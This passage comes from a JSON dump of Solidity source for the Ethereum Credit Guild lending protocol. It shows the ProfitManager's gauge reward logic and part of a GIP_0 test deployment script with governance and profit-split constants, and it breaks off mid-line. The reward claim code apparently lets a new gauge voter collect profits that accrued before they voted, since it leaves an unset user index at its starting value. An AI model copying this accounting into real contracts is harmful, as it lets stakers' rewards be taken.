the weigth is 0, there are no users voting for the gauge.\n                uint256 _gaugeWeight = uint256(\n                    GuildToken(guild).getGaugeWeight(gauge)\n                );\n                if (_gaugeWeight != 0) {\n                    uint256 _gaugeProfitIndex = gaugeProfitIndex[gauge];\n                    if (_gaugeProfitIndex == 0) {\n                        _gaugeProfitIndex = 1e18;\n                    }\n                    gaugeProfitIndex[gauge] =\n                        _gaugeProfitIndex +\n                        (amountForGuild * 1e18) /\n                        _gaugeWeight;\n                }\n            }\n        }\n\n        emit GaugePnL(gauge, block.timestamp, amount);\n    }\n\n    /// @notice claim a user's rewards for a given gauge.\n    /// @dev This should be called every time the user's weight changes in the gauge.\n    function claimGaugeRewards(\n        address user,\n        address gauge\n    ) public returns (uint256 creditEarned) {\n        uint256 _userGaugeWeight = uint256(\n            GuildToken(guild).getUserGaugeWeight(user, gauge)\n        );\n        if (_userGaugeWeight == 0) {\n            return 0;\n        }\n        uint256 _gaugeProfitIndex = gaugeProfitIndex[gauge];\n        uint256 _userGaugeProfitIndex = userGaugeProfitIndex[user][gauge];\n        if (_gaugeProfitIndex == 0) {\n            _gaugeProfitIndex = 1e18;\n        }\n        if (_userGaugeProfitIndex == 0) {\n            _userGaugeProfitIndex = 1e18;\n        }\n        uint256 deltaIndex = _gaugeProfitIndex - _userGaugeProfitIndex;\n        if (deltaIndex != 0) {\n            creditEarned = (_userGaugeWeight * deltaIndex) / 1e18;\n            userGaugeProfitIndex[user][gauge] = _gaugeProfitIndex;\n        }\n        if (creditEarned != 0) {\n            emit ClaimRewards(block.timestamp, user, gauge, creditEarned);\n            CreditToken(credit).transfer(user, creditEarned);\n        }\n    }\n\n    /// @notice claim a user's rewards across all their active gauges.\n    function claimRewards(\n        address user\n    ) external returns (uint256 creditEarned) {\n        address[] memory gauges = GuildToken(guild).userGauges(user);\n        for (uint256 i = 0; i < gauges.length; ) {\n            creditEarned += claimGaugeRewards(user, gauges[i]);\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /// @notice read & return pending undistributed rewards for a given user\n    function getPendingRewards(\n        address user\n    )\n        external\n        view\n        returns (\n            address[] memory gauges,\n            uint256[] memory creditEarned,\n            uint256 totalCreditEarned\n        )\n    {\n        address _guild = guild;\n        gauges = GuildToken(_guild).userGauges(user);\n        creditEarned = new uint256[](gauges.length);\n\n        for (uint256 i = 0; i < gauges.length; ) {\n            address gauge = gauges[i];\n            uint256 _gaugeProfitIndex = gaugeProfitIndex[gauge];\n            uint256 _userGaugeProfitIndex = userGaugeProfitIndex[user][gauge];\n\n            if (_gaugeProfitIndex == 0) {\n                _gaugeProfitIndex = 1e18;\n            }\n            if (_userGaugeProfitIndex == 0) {\n                _userGaugeProfitIndex = 1e18;\n            }\n            uint256 deltaIndex = _gaugeProfitIndex - _userGaugeProfitIndex;\n            if (deltaIndex != 0) {\n                uint256 _userGaugeWeight = uint256(\n                    GuildToken(_guild).getUserGaugeWeight(user, gauge)\n                );\n                creditEarned[i] = (_userGaugeWeight * deltaIndex) / 1e18;\n                totalCreditEarned += creditEarned[i];\n            }\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n}"
    },
    {
      "filename": "test/proposals/gips/GIP_0.sol",
      "content": "//SPDX-License-Identifier: GPL-3.0-or-later\npragma solidity 0.8.13;\n\nimport {ERC20} from \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\nimport {Core} from \"@src/core/Core.sol\";\nimport {Proposal} from \"@test/proposals/proposalTypes/Proposal.sol\";\nimport {CoreRoles} from \"@src/core/CoreRoles.sol\";\nimport {SimplePSM} from \"@src/loan/SimplePSM.sol\";\nimport {AddressLib} from \"@test/proposals/AddressLib.sol\";\nimport {GuildToken} from \"@src/tokens/GuildToken.sol\";\nimport {LendingTerm} from \"@src/loan/LendingTerm.sol\";\nimport {CreditToken} from \"@src/tokens/CreditToken.sol\";\nimport {AuctionHouse} from \"@src/loan/AuctionHouse.sol\";\nimport {GuildGovernor} from \"@src/governance/GuildGovernor.sol\";\nimport {ProfitManager} from \"@src/governance/ProfitManager.sol\";\nimport {ERC20MultiVotes} from \"@src/tokens/ERC20MultiVotes.sol\";\nimport {GuildVetoGovernor} from \"@src/governance/GuildVetoGovernor.sol\";\nimport {RateLimitedMinter} from \"@src/rate-limits/RateLimitedMinter.sol\";\nimport {SurplusGuildMinter} from \"@src/loan/SurplusGuildMinter.sol\";\nimport {LendingTermOnboarding} from \"@src/governance/LendingTermOnboarding.sol\";\nimport {GuildTimelockController} from \"@src/governance/GuildTimelockController.sol\";\nimport {LendingTermOffboarding} from \"@src/governance/LendingTermOffboarding.sol\";\n\n/// @notice deployer must have 100 USDC to deploy the system on mainnet for the initial PSM mint.\ncontract GIP_0 is Proposal {\n    string public constant name = \"Proposal_0\";\n\n    /// --------------------------------------------------------------\n    /// --------------------------------------------------------------\n    /// -------------------- DEPLOYMENT CONSTANTS --------------------\n    /// --------------------------------------------------------------\n    /// --------------------------------------------------------------\n\n    /// @notice maximum guild supply is 1b tokens, however this number can change\n    /// later if new tokens are minted\n    uint256 internal constant GUILD_SUPPLY = 1_000_000_000 * 1e18;\n\n    /// @notice guild mint ratio is 5e18, meaning for 1 credit 5 guild tokens are\n    /// minted in SurplusGuildMinter\n    uint256 internal constant GUILD_MINT_RATIO = 5e18;\n\n    /// @notice ratio of guild tokens received per Credit earned in\n    /// the Surplus Guild Minter\n    uint256 internal constant GUILD_CREDIT_REWARD_RATIO = 0.1e18;\n\n    /// @notice maximum delegates for both credit and guild token\n    uint256 internal constant MAX_DELEGATES = 10;\n\n    /// @notice for each SDAI collateral, up to 1 credit can be borrowed\n    uint256 internal constant MAX_SDAI_CREDIT_RATIO = 1e18;\n\n    /// @notice credit hardcap at launch\n    uint256 internal constant CREDIT_HARDCAP = 2_000_000 * 1e18;\n\n    /// @notice SDAI credit hardcap at launch\n    uint256 internal constant SDAI_CREDIT_HARDCAP = 2_000_000 * 1e18;\n\n    /// ------------------------------------------------------------------------\n    /// @notice Interest Rate Parameters\n    /// ------------------------------------------------------------------------\n\n    /// @notice rate to borrow against SDAI collateral\n    uint256 internal constant SDAI_RATE = 0.04e18;\n\n    /// ------------------------------------------------------------------------\n    /// @notice profit sharing configuration parameters for the Profit Manager\n    /// ------------------------------------------------------------------------\n\n    /// @notice 9% of profits go to the surplus buffer\n    uint256 internal constant SURPLUS_BUFFER_SPLIT = 0.09e18;\n\n    /// @notice 90% of profits go to credit holders that opt into rebasing\n    uint256 internal constant CREDIT_SPLIT = 0.9e18;\n\n    /// @notice 1% of profits go to guild holders staked in gauges\n    uint256 internal constant GUILD_SPLIT = 0.01e18;\n\n    /// @notice 0% of profits go to other\n    uint256 internal constant OTHER_SPLIT = 0;\n    address internal constant OTHER_ADDRESS = address(0);\n\n    uint256 public constant BLOCKS_PER_DAY = 7164;\n\n    // governance params\n    uint256 public constant DAO_TIMELOCK_DELAY = 7 days;\n    uint256 public constant ONBOARD_TIMELOCK_DELAY = 1 days;\n    uint256 public constant DAO_GOVERNOR_GUILD_VOTING_DELAY =\n        0 * BLOCKS_PER_DAY;\n    uint256 public constant DAO_GOVERNOR_GUILD_VOTING_PERIOD =\n        3 * BLOCKS_PER_DAY;\n    uint256 public constant DAO_GOVERNOR_GUILD_PROPOSAL_THRESHOLD =\n        2_500_000e18;\n    uint256 public constant DAO_GOVERNOR_GUILD_QUORUM = 25_000_000e18;\n    uint256 public constant DAO_VETO_CREDIT_QUORUM = 5_000_000e18;\n    uint256 public constant DAO_VETO_GUILD_QUORUM = 15_000_000e18;\n    uint256 public constant ONBOARD_GOVERNOR_GUILD_VOTING_DELAY =\n        0 * BLOCKS_PER_DAY;\n    uint256 public constant ONBOARD_GOVERNOR_GUILD_VOTING_PERIOD =\n        2 * BLOCKS_PER_DAY;\n    uint256 public constant ONBOARD_GOVERNOR_GUILD_PROPOSAL_THRESHOLD =\n        1_000_000e18;\n    uint256 public constant ONBOARD_GOVERNOR_GUILD_QUORUM = 10_000_000e18;\n    uint256 public constant ONBOARD_VETO_CREDIT_QUORUM = 5_000_000e18;\n    uint256 public constant ONBOARD_VETO_GUILD_QUORUM = 10_000_000e18;\n    uint256 public constant OFFBOARD_QUORUM = 10_000_000e18;\n\n    function deploy() public {\n        // Core\n        {\n            Core core = new Core();\n            AddressLib.set(\"CORE\", address(core));\n        }\n\n        // ProfitManager\n        {\n            ProfitManager profitManager = new ProfitManager(\n                AddressLib.get(\"CORE\")\n            );\n            AddressLib.set(\"PROFIT_MANAGER\", address(profitManager));\n        }\n\n        // Tokens & minting\n        {\n            CreditToken credit = new CreditToken(\n                AddressLib.get(\"CORE\"),\n                \"Ethereum Credit Guild - gUSDC\",\n                \"gUSDC\"\n            );\n            GuildToken guild = new GuildToken(\n                AddressLib.get(\"CORE\"),\n                AddressLib.get(\"PROFIT_MANAGER\")\n            );\n            RateLimitedMinter rateLimitedCreditMinter = new RateLimitedMinter(\n                AddressLib.get(\"CORE\"),\n                address(credit),\n                CoreRoles.RATE_LIMITED_CREDIT_MINTER,\n                0, // maxRateLimitPerSecond\n                0, // rateLimitPerSecond\n                uint128(CREDIT_HARDCA"
    }
  ]
}